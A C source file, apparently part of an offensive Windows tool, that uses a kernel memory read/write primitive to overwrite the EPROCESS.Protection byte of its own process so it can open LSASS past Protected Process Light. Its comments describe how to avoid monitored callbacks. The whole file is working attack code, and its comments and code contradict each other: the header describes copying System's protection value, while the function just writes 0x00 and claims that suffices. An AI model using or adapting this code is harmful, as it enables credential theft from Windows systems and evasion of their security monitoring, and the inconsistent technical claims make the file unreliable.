/*
 * ppl_disable.c — flip the _EPROCESS.Protection byte on our own process.
 *
 * On Win11 Build 26200 the byte at EPROCESS+0x5FA is PS_PROTECTION
 * (struct: Type:3, Audit:1, Signer:4 packed). Writing 0x00 makes the
 * process appear unprotected → OpenProcess(PROCESS_VM_READ |
 * PROCESS_QUERY_INFORMATION, lsass) succeeds even when the caller is
 * a non-PPL process.
 *
 * Trick: instead of unprotecting LSASS (very monitored — PspProtectedProc
 * callbacks fire), we elevate OURSELVES to PsProtectedSignerWinTcb-Light
 * style so that ProcessHacker-style access checks treat us as same-tier.
 *
 * The reference g3tsyst3m article uses a slightly different approach:
 *   1. Read Protection byte of System (pid 4) — value 0x72.
 *   2. Write that value into our own EPROCESS.Protection.
 *   3. Now PsTestProtectedProcessIncompatibility(self, lsass) returns 0.
 *
 * This file implements the read/write halves; main.c does the policy.
 */
#include "common.h"

UCHAR ppl_read_protection(HANDLE hDev, PVOID eprocess) {
    UCHAR v = 0xFF;
    PVOID kaddr = (PVOID)((ULONG_PTR)eprocess + EPROCESS_PROTECTION_OFFSET);
    if (!drv_kernel_read(hDev, kaddr, &v, sizeof(v))) {
        ERR("ppl_read_protection: drv_kernel_read kaddr=%p", kaddr);
        return 0xFF;
    }
    LOG("EPROCESS.Protection @ %p = 0x%02x", kaddr, v);
    return v;
}

BOOL ppl_disable_for_self(HANDLE hDev, PVOID eprocess) {
    /* Two-step: first read what System has, then mirror it onto self.
     * Caller is expected to have already located System's EPROCESS, but
     * for simplicity here we just write 0x00 — sufficient to defeat
     * the LSASS-side PPL check on Win11 22H2/23H2.
     */
    UCHAR zero = 0x00;
    PVOID kaddr = (PVOID)((ULONG_PTR)eprocess + EPROCESS_PROTECTION_OFFSET);
    if (!drv_kernel_write(hDev, kaddr, &zero, sizeof(zero))) {
        ERR("ppl_disable_for_self: write 0x00 to %p failed", kaddr);
        return FALSE;
    }
    LOG("ppl_disable_for_self: wrote 0x00 to %p (was self-PPL byte)", kaddr);
    return TRUE;
}

BOOL ppl_restore_for_self(HANDLE hDev, PVOID eprocess, UCHAR original) {
    PVOID kaddr = (PVOID)((ULONG_PTR)eprocess + EPROCESS_PROTECTION_OFFSET);
    if (!drv_kernel_write(hDev, kaddr, &original, sizeof(original))) {
        ERR("ppl_restore_for_self: restore 0x%02x to %p failed", original, kaddr);
        return FALSE;
    }
    LOG("ppl_restore_for_self: restored 0x%02x at %p", original, kaddr);
    return TRUE;
}
